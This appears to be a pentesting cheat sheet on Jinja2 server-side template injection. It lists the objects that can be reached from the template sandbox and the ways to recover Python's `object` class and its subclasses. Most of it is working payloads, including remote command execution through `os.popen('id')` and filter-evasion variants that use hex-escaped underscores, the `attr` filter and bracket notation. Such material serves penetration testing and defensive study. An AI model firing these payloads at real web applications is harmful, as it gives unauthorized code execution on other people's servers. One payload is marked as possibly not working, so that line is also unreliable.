**Resources**:
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
- https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

## Accessing Global Objects

For example, in the code `render_template("hello.html", username=username, email=email)` the objects username and email come from the non-sanboxed python env and will be accessible inside the sandboxed env.

****Moreover, there are other objects that will be always accessible from the sandboxed env, these are:

```
[]
''
()
dict
config
request
```

## Recovering `<class 'object'>`

Then, from these objects we need to get to the class: `<class 'object'>` in order to try to recover defined classes. This is because from this object we can call the `__subclasses__` method and access all the classes from the non-sandboxed python env.  


In order to access that object class, you need to access a class object and then access either `__base__`, `__mro__()[-1]` or `.mro()[-1]`. And then, after reaching this object class we call `__subclasses__()`.

```
# To access a class object

[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object". 
## "dict" used as example from the previous list:

dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()

{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways

{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}


# Not sure if this will work, but I saw it somewhere

{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}

I initially built the following payload for remote command execution, and will now try and apply as many filter bypasses as I can.

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

If the waf blocks ".": {{request['application']['__globals__']

['__builtins__']['__import__']('os')['popen']('id')['read']()}}

If the waf blocks "." and "_": {{request['application']

['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}

Bypassing the blocks on ".", "_", "[]" and "|join" makes the payload turn into this payload I made for PayloadAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9), also found on my twitter (https://twitter.com/SecGus/status/1249744031392940033):

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}


```